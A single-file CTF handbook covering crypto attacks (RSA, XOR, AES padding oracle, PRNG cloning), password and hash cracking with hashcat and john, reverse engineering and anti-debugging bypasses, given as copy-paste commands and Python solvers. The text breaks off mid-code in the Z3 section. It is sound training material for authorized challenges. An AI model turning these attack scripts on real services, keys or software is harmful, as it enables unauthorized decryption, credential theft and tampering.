# CTF Solver Handbook — Crypto · Reverse Engineering · Web · Pwn

A single-file, offline reference for solving CTF challenges **manually, without AI**.
Everything here is copy-pasteable: commands, one-liners, and working Python solver skeletons.

> **Scope / ethics:** Use these techniques only on CTF targets, challenge binaries, and lab systems you are explicitly authorized to test. Never point scanners, brute-forcers, or exploit scripts at systems you do not own or have permission to attack.

---

## Table of Contents

1. [Setup — the toolbox](#1-setup--the-toolbox)
2. [General methodology](#2-general-methodology)
3. [Encoding & classical crypto](#3-encoding--classical-crypto)
4. [XOR](#4-xor)
5. [RSA attacks](#5-rsa-attacks)
6. [Block ciphers — AES modes](#6-block-ciphers--aes-modes)
7. [Hashes & password cracking](#7-hashes--password-cracking)
8. [PRNG attacks](#8-prng-attacks)
9. [Discrete log, ECC, lattices](#9-discrete-log-ecc-lattices)
10. [Reverse engineering](#10-reverse-engineering)
11. [Symbolic execution & constraint solving](#11-symbolic-execution--constraint-solving)
12. [Binary exploitation (pwn)](#12-binary-exploitation-pwn)
13. [Web exploitation](#13-web-exploitation)
14. [Forensics, stego, misc](#14-forensics-stego-misc)
15. [Flag hunting & automation](#15-flag-hunting--automation)
16. [Strategy for actually winning](#16-strategy-for-actually-winning)
17. [Practice resources](#17-practice-resources)

---

## 1. Setup — the toolbox

### Python environment

```bash
python3 -m venv ~/ctf && source ~/ctf/bin/activate
pip install pycryptodome gmpy2 sympy z3-solver requests pwntools \
            angr capstone unicorn ropper ROPgadget hashid factordb-python
```

### System packages (Debian/Ubuntu/Kali)

```bash
sudo apt update && sudo apt install -y \
  gdb gdb-multiarch binutils file strace ltrace upx-ucl \
  radare2 binwalk foremost exiftool steghide zsteg pngcheck \
  john hashcat sqlmap ffuf gobuster nikto wfuzz \
  nmap netcat-traditional socat patchelf \
  sagemath fcrackzip pdfcrunch volatility3
```

### GUI / heavy tools

| Purpose | Tool |
|---|---|
| Decompiler | Ghidra (free), IDA Free, Binary Ninja |
| .NET reversing | dnSpy, ILSpy |
| Java / Android | jadx, apktool, JD-GUI |
| HTTP proxy | Burp Suite Community, Caido, mitmproxy |
| Debugger plugins | pwndbg / GEF / peda for gdb |
| Windows RE | x64dbg, PEiD, Detect It Easy (DIE) |
| Hex editor | ImHex, 010 Editor, HxD |
| Math | SageMath, Pari/GP |

Install pwndbg:

```bash
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
```

### Universal pwntools starter

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
context.log_level = 'debug'          # see every byte sent/received

def conn():
    if args.REMOTE:
        return remote(args.HOST or 'chall.ctf.net', int(args.PORT or 1337))
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b *main\nc\n')
    return process(elf.path)

io = conn()
# ... exploit ...
io.interactive()
```

Run: `python3 x.py` (local) · `python3 x.py GDB` · `python3 x.py REMOTE HOST=1.2.3.4 PORT=31337`

---

## 2. General methodology

**The 10-minute triage loop** — do this before deep work on any challenge:

1. Read the challenge name, description, and hint. They are usually the biggest clue.
2. `file`, `checksec`, `strings`, `exiftool`, `binwalk` — whichever applies.
3. Identify the *category* and the *intended bug class*. CTF bugs are almost always one of ~30 known patterns.
4. Search your memory/notes for that pattern. If nothing, search the exact error string or constant.
5. Set a time box (e.g. 45 min). If stuck, switch challenges and come back — background thinking works.

**Questions that unstick most challenges:**

- What does the attacker control? (input, timing, IV, key length, filename, header)
- What is *reused* that shouldn't be? (nonce, key, modulus, prime, seed, token)
- What is *leaked*? (error messages, timing, padding validity, LSB, partial key)
- What is *small*? (e, d, key space, prime, entropy, password)
- What is *malleable*? (CBC ciphertext, ECB blocks, JWT, serialized object)
- What is the trust boundary the author forgot? (client-side check, hidden field, referer)

**Keep a solve log.** One text file per CTF: challenge, category, the bug, the payload, the flag. This becomes your personal cheat sheet and is worth more than any tool.

---

## 3. Encoding & classical crypto

### Identify first

```bash
# CyberChef locally (offline, no AI, drag-and-drop recipes)
# https://gchq.github.io/CyberChef/  -> download the zip, open index.html

hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hash-identifier
```

Quick visual rules:

| Look | Likely |
|---|---|
| `A–Z a–z 0–9 + /` with `=` padding | Base64 |
| `A–Z 2–7` with `=` | Base32 |
| `0–9 a–f`, even length | Hex |
| Ends `==`, length %4==0, decodes to text | Base64 (try repeatedly — nested) |
| `0–9 a–f` length 32/40/64/128 | MD5 / SHA1 / SHA256 / SHA512 |
| `$2b$`, `$6$`, `$argon2id$` | bcrypt / sha512crypt / argon2 |
| Only letters, word spacing preserved | Substitution / Caesar / Vigenère |
| `.-` and spaces | Morse |
| `+`/`-`/`>`/`<`/`[`/`]` | Brainfuck |
| Only `Ook.`/`!`/`?` | Ook! / Malbolge |
| Weird unicode spacing | Unicode stego / whitespace |

### Auto-decode onion (base64/32/16/hex loop)

```python
import base64, binascii, re

def peel(data: bytes, depth=25):
    for _ in range(depth):
        s = data.strip()
        for name, fn in [
            ('b64', base64.b64decode),
            ('b32', base64.b32decode),
            ('b16', base64.b16decode),
            ('a85', base64.a85decode),
            ('b85', base64.b85decode),
            ('hex', bytes.fromhex),
        ]:
            try:
                out = fn(s)
                if out and out != data and len(out) < len(data):
                    print(f'[{name}] -> {out[:80]!r}')
                    data = out
                    break
            except Exception:
                continue
        else:
            break
    return data

print(peel(open('cipher.txt','rb').read()))
```

### Caesar / ROT-n brute force

```python
s = open('cipher.txt').read()
for k in range(26):
    out = ''.join(chr((ord(c)-b-k) % 26 + b) if c.isalpha()
                  else c for c in s for b in [65 if c.isupper() else 97])
    print(k, out)
```

```bash
# ROT13 / ROT47
echo 'uryyb' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
echo 'flag{...}' | tr '\!-~' 'P-~\!-O'
```

### Atbash

```python
import string
t = str.maketrans(string.ascii_lowercase + string.ascii_uppercase,
                  string.ascii_lowercase[::-1] + string.ascii_uppercase[::-1])
print(s.translate(t))
```

### Vigenère — crack the key length, then each column

```python
from collections import Counter
import string

def clean(s): return ''.join(c for c in s.upper() if c.isalpha())

def keylen_scores(ct, maxlen=30):
    ct = clean(ct)
    scores = []
    for L in range(1, maxlen+1):
        cols = [ct[i::L] for i in range(L)]
        ic = sum(sum(n*(n-1) for n in Counter(c).values()) /
                 (len(c)*(len(c)-1)) for c in cols if len(c) > 1) / L
        scores.append((ic, L))
    return sorted(scores, reverse=True)[:5]      # IC ~0.066 => correct length

FREQ = [0.0817,0.0149,0.0278,0.0425,0.1270,0.0223,0.0202,0.0609,0.0697,
        0.0015,0.0077,0.0403,0.0241,0.0675,0.0751,0.0193,0.0010,0.0599,
        0.0633,0.0906,0.0276,0.0098,0.0236,0.0015,0.0197,0.0007]

def shift_key(col):
    best = None
    for k in range(26):
        cnt = Counter((ord(c)-65-k) % 26 for c in col)
        chi = sum((cnt.get(i,0) - len(col)*FREQ[i])**2 / (len(col)*FREQ[i])
                  for i in range(26))
        if best is None or chi < best[0]:
            best = (chi, k)
    return best[1]

def crack_vigenere(ct):
    ct = clean(ct)
    L = keylen_scores(ct)[0][1]
    key = ''.join(chr(65 + shift_key(ct[i::L])) for i in range(L))
    pt = ''.join(chr((ord(c)-65-ord(key[i % L])+65) % 26 + 65)
                   for i, c in enumerate(ct))
    return key, pt

print(crack_vigenere(open('cipher.txt').read()))
```

### Substitution — hill climbing with quadgram scores

Use **[quipqiup](https://quipqiup.com)** (statistical, not AI) or `subbreaker`:

```bash
pip install subbreaker
subbreaker crack --text cipher.txt --nbest 5
```

### Rail fence / columnar transposition

```python
def railfence_decrypt(ct, rails):
    pattern = list(range(rails)) + list(range(rails-2, 0, -1))
    idx = [pattern[i % len(pattern)] for i in range(len(ct))]
    out, pos = ['']*len(ct), 0
    for r in range(rails):
        for i, v in enumerate(idx):
            if v == r:
                out[i] = ct[pos]; pos += 1
    return ''.join(out)

for r in range(2, 12):
    print(r, railfence_decrypt(ct, r))
```

### Others worth knowing

- **Affine**: `E(x)=(a*x+b) mod 26`, brute force `a∈{1,3,5,7,9,11,15,17,19,21,23,25}`, `b∈0..25` → 312 keys.
- **Playfair / Bifid / Four-square**: `pip install pycipher` → `pycipher.Playfair('KEYWORD').decipher(ct)`.
- **Enigma**: `pip install py-enigma`.
- **Book cipher / OTP reuse**: see XOR crib dragging below.

---

## 4. XOR

### Single-byte XOR brute force

```python
data = bytes.fromhex(open('cipher.hex').read().strip())
def score(b):
    return sum(1 for c in b if 32 <= c < 127 or c in (9,10,13))
for k in range(256):
    pt = bytes(c ^ k for c in data)
    if score(pt) == len(pt):
        print(hex(k), pt)
```

Rank by English fitness if many candidates:

```python
FREQ = b'etaoinshrdlu cm'
def fitness(pt):
    return sum(FREQ.count(bytes([c|32])) for c in pt if chr(c).isalpha() or c==32)
best = sorted(((fitness(bytes(c^k for c in data)), k) for k in range(256)), reverse=True)
```

### Repeating-key XOR — keysize via normalized Hamming distance

```python
def ham(a, b): return sum((x ^ y).bit_count() for x, y in zip(a, b))

def best_keysizes(data, n=5):
    res = []
    for ks in range(2, 41):
        blocks = [data[i:i+ks] for i in range(0, ks*4, ks)]
        if len(blocks) < 4: continue
        d = sum(ham(blocks[i], blocks[i+1]) for i in range(3)) / 3 / ks
        res.append((d, ks))
    return [k for _, k in sorted(res)[:n]]

def solve_single(block):
    return max(range(256), key=lambda k: fitness(bytes(c ^ k for c in block)))

def break_repeating(data):
    out = []
    for ks in best_keysizes(data):
        key = bytes(solve_single(data[i::ks]) for i in range(ks))
        pt = bytes(c ^ key[i % ks] for i, c in enumerate(data))
        out.append((ks, key, pt))
    return out
```

```bash
# Tooling shortcut
pip install xortool
xortool cipher.bin -c 20      # -c = most common char is space (0x20)
xortool -l 16 -b cipher.bin   # known key length, binary data
```

### Known-plaintext / crib dragging

```python
# If you know part of the plaintext (e.g. "flag{", "HTB{", "Dear ")
crib = b'flag{'
for i in range(len(ct) - len(crib)):
    frag = bytes(ct[i+j] ^ crib[j] for j in range(len(crib)))
    if all(32 <= c < 127 for c in frag):
        print(i, frag)
```

**Two-time pad** (same key, two messages):

```python
x = bytes(a ^ b for a, b in zip(ct1, ct2))   # = pt1 ^ pt2
# Drag common words (" the ", " and ", "flag{") across x.
# A hit reveals plaintext in BOTH messages at that offset; extend outward.
```

### XOR with a rolling / self-referential key

```python
# pt[i] = ct[i] ^ ct[i-1]   (CBC-like XOR chaining with no cipher)
pt = bytes(ct[i] ^ ct[i-1] for i in range(1, len(ct)))
# or pt[i] = ct[i] ^ pt[i-1]
pt = bytearray([ct[0]])
for c in ct[1:]: pt.append(c ^ pt[-1])
```

---

## 5. RSA attacks

### Standard decryption (you recovered p, q)

```python
from Crypto.Util.number import inverse, long_to_bytes
n = p*q
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

### Attack decision tree

| Symptom | Attack |
|---|---|
| `e = 3` and short message | Small-e / cube root |
| Same `m` to 3+ recipients, `e=3` | Håstad broadcast (CRT) |
| Huge `e` (close to `n`) | Wiener / Boneh–Durfee (small `d`) |
| Same `n`, two different `e`, same `m` | Common modulus |
| `p`, `q` very close | Fermat factorization |
| `n` is small (< 256 bits) | factordb / yafu / msieve |
| `n` has many small factors | Multi-prime RSA |
| `dp = d mod (p-1)` leaked | dp leak → factor n |
| `p+q` or `p-q` or `phi` leaked | Quadratic solve |
| Padding oracle / LSB oracle | Adaptive attack |
| `gcd(n1, n2) != 1` | Shared prime (batch GCD) |
| Known high bits of `p` | Coppersmith (Sage) |

### Small public exponent (e-th root)

```python
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes

m, exact = iroot(c, e)
if exact:
    print(long_to_bytes(int(m)))
else:
    # m^e wrapped the modulus k times — try small k
    for k in range(1, 100000):
        m, exact = iroot(c + k*n, e)
        if exact:
            print(k, long_to_bytes(int(m))); break
```

### Håstad broadcast attack

```python
from sympy.ntheory.modular import crt
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes

# ns = [n1,n2,n3], cs = [c1,c2,c3], all e = 3
N = crt(ns, cs)[0]
m, ok = iroot(int(N), 3)
assert ok
print(long_to_bytes(int(m)))
```

### Common modulus attack

```python
from Crypto.Util.number import inverse, long_to_bytes
from math import gcd

# same n, same m, e1 and e2 with gcd(e1,e2)=1
def egcd(a, b):
    if b == 0: return (a, 1, 0)
    g, x, y = egcd(b, a % b)
    return (g, y, x - (a//b)*y)

g, a, b = egcd(e1, e2)
m = (pow(c1, a, n) * pow(c2, b, n)) % n     # handle negatives:
if a < 0: m = (pow(inverse(c1, n), -a, n) * pow(c2, b, n)) % n
if b < 0: m = (pow(c1, a, n) * pow(inverse(c2, n), -b, n)) % n
print(long_to_bytes(m))
```

### Wiener's attack (small private exponent d)

```python
from Crypto.Util.number import long_to_bytes, isPrime
from gmpy2 import isqrt

def cf_expansion(num, den):
    while den:
        q = num // den
        yield q
        num, den = den, num - q*den

def convergents(cf):
    n0, n1, d0, d1 = 0, 1, 1, 0
    for q in cf:
        n0, n1 = n1, q*n1 + n0
        d0, d1 = d1, q*d1 + d0
        yield n1, d1

def wiener(e, n):
    for k, d in convergents(cf_expansion(e, n)):
        if k == 0: continue
        if (e*d - 1) % k: continue
        phi = (e*d - 1)//k
        s = n - phi + 1                 # p + q
        disc = s*s - 4*n
        if disc < 0: continue
        r = isqrt(disc)
        if r*r != disc: continue
        p, q = (s + r)//2, (s - r)//2
        if p*q == n:
            return d, p, q
    return None

res = wiener(e, n)
if res:
    d, p, q = res
    print(long_to_bytes(pow(c, d, n)))
```

If Wiener fails but `e` is still large → **Boneh–Durfee** (use the `defund/coppersmith` or `boneh_durfee.sage` scripts with SageMath).

### Fermat factorization (p ≈ q)

```python
from gmpy2 import isqrt
def fermat(n, limit=1_000_000):
    a = isqrt(n)
    if a*a < n: a += 1
    for _ in range(limit):
        b2 = a*a - n
        b = isqrt(b2)
        if b*b == b2:
            return int(a-b), int(a+b)
        a += 1
    return None
```

### dp leak

```python
from math import gcd
# dp = d mod (p-1)
for x in range(1, e):
    p = gcd(pow(2, e*dp, n) - 2, n)
    if 1 < p < n:
        break
# simpler standard form:
p = gcd(pow(2, e*dp, n) - 2, n)
q = n // p
```

### Known phi / p+q / p−q

```python
from gmpy2 import isqrt
# given phi:
s = n - phi + 1
r = isqrt(s*s - 4*n)
p, q = (s+r)//2, (s-r)//2

# given p+q  -> same as s above
# given p-q  -> s = isqrt((p-q)**2 + 4*n)
```

### Shared prime across moduli (batch GCD)

```python
from math import gcd
for i in range(len(ns)):
    for j in range(i+1, len(ns)):
        g = gcd(ns[i], ns[j])
        if g != 1:
            print(i, j, g)
```

### LSB / parity oracle

```python
from Crypto.Util.number import long_to_bytes
# oracle(c) returns the least significant bit of decrypt(c)
lo, hi = 0, n
mult = pow(2, e, n)
cur = c
for _ in range(n.bit_length()):
    cur = (cur * mult) % n
    if oracle(cur): lo = (lo + hi)//2
    else:           hi = (lo + hi)//2
print(long_to_bytes(int(hi)))
```

### Factoring tools

```bash
# Online database (fast for < 512-bit or "special" numbers)
python3 -c "from factordb.factordb import FactorDB; f=FactorDB(n); f.connect(); print(f.get_factor_list())"

# Local
yafu "factor(@)" -batchfile nums.txt
msieve -q -v n
sage: factor(n)
# Pollard p-1 / rho for medium composites:
sage: from sage.interfaces.ecm import ecm; ecm.factor(n)
```

### Coppersmith (partial key / stereotyped message) — Sage

```python
# Known high bits of p:
P.<x> = PolynomialRing(Zmod(n))
p0 = known_high_bits
f = x + p0
roots = f.small_roots(X=2^(unknown_bits), beta=0.4)
print(roots)

# Stereotyped message: m = known_prefix + x, c = m^e mod n
P.<x> = PolynomialRing(Zmod(n))
f = (known_prefix + x)^e - c
print(f.small_roots(X=2^(unknown_bits), epsilon=1/20))
```

---

## 6. Block ciphers — AES modes

### Detect ECB

```python
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
print(len(blocks) - len(set(blocks)))   # > 0 => ECB (repeated plaintext blocks)
```

**ECB byte-at-a-time decryption** (oracle encrypts `your_input || secret`):

```python
def find_blocksize(oracle):
    n = len(oracle(b''))
    for i in range(1, 64):
        if len(oracle(b'A'*i)) != n:
            return len(oracle(b'A'*i)) - n

def ecb_bat(oracle, bs=16):
    known = b''
    total = len(oracle(b''))
    for i in range(total):
        pad = b'A' * (bs - 1 - (i % bs))
        target_blk = i // bs
        target = oracle(pad)[target_blk*bs:(target_blk+1)*bs]
        for g in range(256):
            probe = pad + known + bytes([g])
            if oracle(probe)[target_blk*bs:(target_blk+1)*bs] == target:
                known += bytes([g]); break
        else:
            break
    return known
```

**ECB cut-and-paste** — craft `role=admin` by aligning blocks and swapping ciphertext blocks. No key needed.

### CBC bit flipping

```python
# Goal: change "admin=0" -> "admin=1" in a known plaintext position.
# Flip bytes in the PREVIOUS ciphertext block (or IV for block 0).
def cbc_flip(prev_block, known, target):
    return bytes(p ^ k ^ t for p, k, t in zip(prev_block, known, target))

iv2 = cbc_flip(iv, b'admin=0', b'admin=1')
new_ct = iv2 + ct          # block 0 gets garbled only if you flip inside ct
```

### CBC padding oracle

```python
import requests
from pwn import xor

BS = 16
def oracle(ct: bytes) -> bool:
    r = requests.get(URL, cookies={'auth': ct.hex()})
    return 'padding' not in r.text.lower()      # adapt to the actual signal

def decrypt_block(prev, block):
    inter = bytearray(BS)
    plain = bytearray(BS)
    for pad in range(1, BS+1):
        idx = BS - pad
        crafted = bytearray(BS)
        for j in range(idx+1, BS):
            crafted[j] = inter[j] ^ pad
        for g in range(256):
            crafted[idx] = g
            if oracle(bytes(crafted) + block):
                # guard against false positive on the last byte
                if pad == 1:
                    c2 = bytearray(crafted); c2[idx-1] ^= 1
                    if not oracle(bytes(c2) + block): continue
                inter[idx] = g ^ pad
                plain[idx] = inter[idx] ^ prev[idx]
                break
        else:
            raise Exception('oracle failed')
    return bytes(plain)

def decrypt_all(ct):
    blocks = [ct[i:i+BS] for i in range(0, len(ct), BS)]
    return b''.join(decrypt_block(blocks[i-1], blocks[i]) for i in range(1, len(blocks)))
```

**Encryption via padding oracle** works too: decrypt backwards from the last block to build a chosen ciphertext.
Tool shortcut: `padbuster URL ENCODED_BLOCK 8/16 -cookies ...` or `python-paddingoracle`.

### CTR / nonce reuse (two-time pad again)

```python
# Same key+nonce => identical keystream
ks = xor(ct1, known_pt1)
pt2 = xor(ct2, ks)
```

### GCM nonce reuse

Repeating nonce in GCM leaks the authentication subkey `H` → forge tags. Look for the `nonce reused` / `forbidden attack` pattern; use `nonce-disrespect` tooling.

### Useful helpers

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import long_to_bytes, bytes_to_long

AES.new(key, AES.MODE_ECB).decrypt(ct)
AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
unpad(pt, 16)
```

---

## 7. Hashes & password cracking

### Identify

```bash
hashid -m 'HASH'          # -m gives hashcat mode
hashcat --identify hash.txt
```

### Common hashcat modes

| Mode | Type |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 1800 | sha512crypt (`$6$`) |
| 500 | md5crypt (`$1$`) |
| 13100 | Kerberos TGS (kerberoast) |
| 22000 | WPA-PBKDF2 |
| 16500 | JWT HS256 |
| 10900 | PBKDF2-HMAC-SHA256 |

### Cracking

```bash
# Dictionary + rules (best ROI)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hash.txt rockyou.txt -r rules/dive.rule --force

# Mask attacks (known format, e.g. Flag + 4 digits)
hashcat -m 0 hash.txt -a 3 '?u?l?l?l?l?d?d?d?d'

# Combinator / hybrid
hashcat -m 0 hash.txt -a 6 wordlist.txt '?d?d?d'

john --wordlist=rockyou.txt --rules hash.txt
john --format=raw-md5 --show hash.txt

# Zip / PDF / SSH / 7z
zip2john file.zip > z.john && john z.john
pdf2john.pl file.pdf > p.john && john p.john
ssh2john id_rsa > s.john && john s.john
7z2john.pl file.7z > s7.john && john s7.john
```

### Hash length extension (MD5 / SHA1 / SHA256, Merkle–Damgård)

If `tag = H(secret || message)` and you know `len(secret)`:

```bash
pip install hashpumpy
```

```python
import hashpumpy
new_tag, new_msg = hashpumpy.hashpump(original_tag, original_message,
                                      b'&admin=true', keylen)
# brute keylen 0..40 if unknown
```

Or `hash_extender -d 'user=x' -s SIG -a '&admin=true' -f sha1 --secret-min=8 --secret-max=32`.

### HMAC vs raw hash

`HMAC(k, m)` is **not** length-extendable. If the challenge uses `SHA256(key || msg)` it is. Always check which one.

### Collision tricks

- MD5 chosen-prefix collisions: `hashclash` (`cpc.sh`).
- `fastcoll` for identical-prefix collisions (two PDFs / two executables, same MD5).
- PHP loose comparison: `"0e123..." == "0e456..."` → true. Magic hashes: `240610708`, `QNKCDZO`, `aabg7XSs`.

---

## 8. PRNG attacks

### MT19937 — clone from 624 outputs

```python
def untemper(y):
    y = undo_right(y, 18)
    y = undo_left(y, 15, 0xefc60000)
    y = undo_left(y, 7,  0x9d2c5680)
    y = undo_right(y, 11)
    return y

def undo_right(y, shift):
    x = 0
    for _ in range(32 // shift + 1):
        x = y ^ (x >> shift)
    return x & 0xffffffff

def undo_left(y, shift, mask):
    x = 0
    for _ in range(32 // shift + 1):
        x = y ^ ((x << shift) & mask)
    return x & 0xffffffff

import random
state = tuple(untemper(o) for o in outputs624) + (624,)
rng = random.Random(); rng.setstate((3, state, None))
print([rng.getrandbits(32) for _ in range(10)])   # future outputs
```

Shortcut: `pip install randcrack` → `rc.submit(n)` × 624 → `rc.predict_getrandbits(32)`.

If outputs are truncated (e.g. only 16 bits), use Z3 / `mt19937predictor` with SAT.

### LCG — recover parameters

```python
from math import gcd
from functools import reduce
from Crypto.Util.number import inverse

# Known modulus m, 3 consecutive states
a = (s2 - s1) * inverse(s1 - s0, m) % m
b = (s1 - a*s0) % m

# Unknown modulus: use t_i = s_{i+1} - s_i, then m divides t_{i+2}*t_i - t_{i+1}^2
diffs = [states[i+1]-states[i] for i in range(len(states)-1)]
zeroes = [diffs[i+2]*diffs[i] - diffs[i+1]**2 for i in range(len(diffs)-2)]
m = reduce(gcd, zeroes)
m = abs(m)
```

### Time-seeded PRNG

```python
import random, time
# Server seeded with int(time.time()) around your request time
for seed in range(t0-300, t0+300):
    r = random.Random(seed)
    if r.getrandbits(32) == observed:
        print('seed', seed); break
```

### Weak seeds to try

`0`, `1`, `1337`, `0xdeadbeef`, the challenge name, the timestamp, `srand(time(NULL))` with a small window, Python `random.seed(os.urandom(...))` truncated to a small space.

---

## 9. Discrete log, ECC, lattices

### Baby-step giant-step

```python
from math import isqrt
def bsgs(g, h, p):
    m = isqrt(p) + 1
    table = {pow(g, j, p): j for j in range(m)}
    factor = pow(g, -m, p)
    cur = h
    for i in range(m):
        if cur in table: return i*m + table[cur]
        cur = cur * factor % p
    return None
```

### Pohlig–Hellman (smooth group order)

```python
from sympy.ntheory import factorint
from sympy.ntheory.modular import crt
# Solve DLP in each prime-power subgroup, then CRT the results.
```

```bash
sage: F = GF(p); F(h).log(F(g))
```

### ECC quickies

- **Small curve order / smooth order** → Pohlig–Hellman on the curve group.
- **Singular curve** (`4a³+27b² ≡ 0`) → map to additive/multiplicative group, DLP becomes trivial.
- **Invalid curve attack**: server accepts your point without checking it's on the curve → send points on weak curves, CRT the results.
- **Same nonce in ECDSA** across two signatures → recover private key:

```python
k = (z1 - z2) * inverse(s1 - s2, n) % n
d = (s1*k - z1) * inverse(r, n) % n
```

- **Biased/partially known ECDSA nonces** → HNP + LLL (see `minerva`, `ladderleak`).

### Lattice / LLL

Use for: knapsack/subset-sum, truncated LCG, partial-key RSA, HNP, approximate GCD.

```python
# SageMath
M = Matrix(ZZ, [[...]])
print(M.LLL())
print(M.BKZ(block_size=20))
```

```bash
pip install fpylll
```

```python
from fpylll import IntegerMatrix, LLL
A = IntegerMatrix.from_matrix(rows)
LLL.reduction(A)
```

Knapsack (low density) template:

```python
def knapsack_lattice(weights, target):
    n = len(weights)
    M = matrix(ZZ, n+1, n+1)
    for i in range(n):
        M[i,i] = 2
        M[i,n] = weights[i]
        M[n,i] = 1
    M[n,n] = target
    for row in M.LLL():
        if all(abs(x) == 1 for x in row[:-1]) and row[-1] == 0:
            return [(1 - x)//2 for x in row[:-1]]
```

---

## 10. Reverse engineering

### Triage checklist

```bash
file chall
checksec --file=chall
strings -n 6 chall | less
strings -el chall                 # UTF-16 (Windows binaries)
readelf -h -S -s chall
objdump -d -M intel chall | less
nm -C chall
ltrace ./chall                    # library calls: strcmp, memcmp, printf
strace ./chall                    # syscalls: openat, ptrace, read
```

**`ltrace` alone solves a huge fraction of easy crackmes** — it prints `strcmp("yourinput", "real_flag")`.

### Detect packing / language

```bash
upx -d chall -o unpacked       # UPX
diec chall                     # Detect It Easy CLI
binwalk chall                  # embedded files
```

| Signature | Language | Tool |
|---|---|---|
| `.NET`, `mscoree.dll` | C# | dnSpy / ILSpy |
| `JAVA`, `.class`, `META-INF` | Java | jadx / JD-GUI |
| `PyInstaller`, `pyi-` | Python | pyinstxtractor + decompyle3/uncompyle6 |
| `Go build ID` | Go | GoReSym, IDA + golang loader |
| `rustc`, `core::panicking` | Rust | Ghidra, focus on `main::main` |
| `.pyc` magic | Python bytecode | `dis`, `pycdc` |
| `Lua`, `LuaQ` | Lua | unluac |
| WASM `\0asm` | WebAssembly | wasm2wat, wasm-decompile |
| AutoIt, `.au3` | AutoIt | Exe2Aut |

**Python exe recovery:**

```bash
python pyinstxtractor.py chall.exe
# then decompile the extracted main.pyc (fix the magic header if needed)
pycdc main.pyc
# or: python3 -c "import dis,marshal,sys; dis.dis(marshal.load(open('main.pyc','rb')))"
```

### Ghidra workflow (fast path)

1. Import → auto-analyze (enable Decompiler Parameter ID, Aggressive Instruction Finder).
2. `Search → For Strings` → find `"Correct"`, `"Wrong"`, `"flag"`.
3. Double-click the string → `References → Show References to Address` → land in the checking function.
4. Read the decompiled C. Rename variables as you go (`L`), retype (`Ctrl+L`).
5. Identify the transform: XOR loop, base64, custom hash, TEA/XTEA, matrix multiply, memcmp against a constant.
6. Reimplement the *inverse* in Python.

**Key Ghidra shortcuts:** `G` goto address · `L` rename · `Ctrl+Shift+F` search · `;` comment · `Ctrl+E` edit function signature · `D` disassemble.

### Common crackme transforms and their inverses

```python
# 1) XOR with index
pt = bytes(c ^ (i & 0xff) for i, c in enumerate(enc))

# 2) ADD/SUB then XOR
pt = bytes(((c - 7) ^ 0x42) & 0xff for c in enc)

# 3) Reverse + swap nibbles
pt = bytes(((c << 4) | (c >> 4)) & 0xff for c in enc[::-1])

# 4) Custom base64 alphabet
import base64, string
std = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
custom = b'CUSTOM_ALPHABET_HERE...'
tbl = bytes.maketrans(custom, std)
print(base64.b64decode(enc.translate(tbl)))

# 5) TEA / XTEA — implement the decrypt loop with the extracted key & delta 0x9E3779B9

# 6) Matrix multiply mod 256 -> invert the matrix over GF(256) or Zmod(256) in Sage
```

### Anti-debugging bypasses

| Trick | Bypass |
|---|---|
| `ptrace(PTRACE_TRACEME)` | Patch to `nop`, or `LD_PRELOAD` a fake `ptrace` returning 0 |
| `IsDebuggerPresent` (Win) | Patch the PEB `BeingDebugged` byte, or set `eax=0` after the call |
| Timing checks (`rdtsc`, `clock_gettime`) | Patch the comparison, or run under a fast path |
| `int3` / `0xCC` scanning | Replace with `nop` |
| Self-modifying code | Dump memory *after* decryption with gdb |
| SIGTRAP handler tricks | `handle SIGTRAP nostop noprint pass` in gdb |

```bash
# Fake ptrace
cat > fake.c <<'EOF'
long ptrace(int r, ...) { return 0; }
EOF
gcc -shared -fPIC fake.c -o fake.so
LD_PRELOAD=./fake.so ./chall
```

### gdb / pwndbg essentials

```
b *0x401234            # breakpoint at address
b *main+0x42
r < input.txt          # run with input
c / n / s / finish     # continue / next / step / finish
x/32xb $rsp            # examine bytes
x/16gx $rsp            # examine qwords
x/s 0x404000           # examine string
telescope $rsp 20      # pwndbg: deref chain
vmmap                  # memory map (ASLR bases)
set $eax = 0           # change a register mid-run
set {char}0x404000 = 0x41
dump binary memory out.bin 0x404000 0x404100
patch string 0x404000 "flag"
disassemble main
info functions
checksec
```

**Patch a `jnz` to `jz` (or to `jmp`) to skip the check:**

```python
from pwn import *
elf = ELF('./chall')
# find the conditional jump and flip it
data = bytearray(open('chall','rb').read())
data[offset] = 0x75 if data[offset] == 0x74 else 0x74   # jz <-> jnz
open('patched','wb').write(data)
```

```bash
# Or force the return value in gdb
gdb -q ./chall -ex 'b *check_addr' -ex 'r' -ex 'set $eax=1' -ex 'c'
```

### radare2 one-liners

```bash
r2 -A chall
> afl              # functions
> pdf @ main       # disassemble main
> iz               # strings in data sections
> axt @ 0x401234   # cross-references
> s main; VV       # visual graph
> wao nop          # nop current instruction
```

### Side channels when static fails

```bash
# Instruction counting reveals correct prefix (pin / perf / qemu)
perf stat ./chall <<< 'flag{a'
# Timing per character
python3 - <<'EOF'
import subprocess, time, string
known = 'flag{'
while not known.endswith('}'):
    best = max(string.printable[:95],
        key=lambda c: (lambda t0: (subprocess.run(['./chall'], input=(known+c).encode(),
                       capture_output=True), time.perf_counter()-t0)[1])(time.perf_counter()))
    known += best; print(known)
EOF
```

---

## 11. Symbolic execution & constraint solving

### Z3 — the workhorse

```python
from z3 import *

s = Solver()
flag = [BitVec(f'c{i}', 8) for i in range(32)]

for c in flag:
    s.add(c >= 0x20, c <= 0x7e)
s.add(flag[0] == ord('f'), flag[1] == ord('l'), flag[2] == ord('a'), flag[3] == ord('g'))

# Transcribe the checks from the decompiler:
for i in range(31):
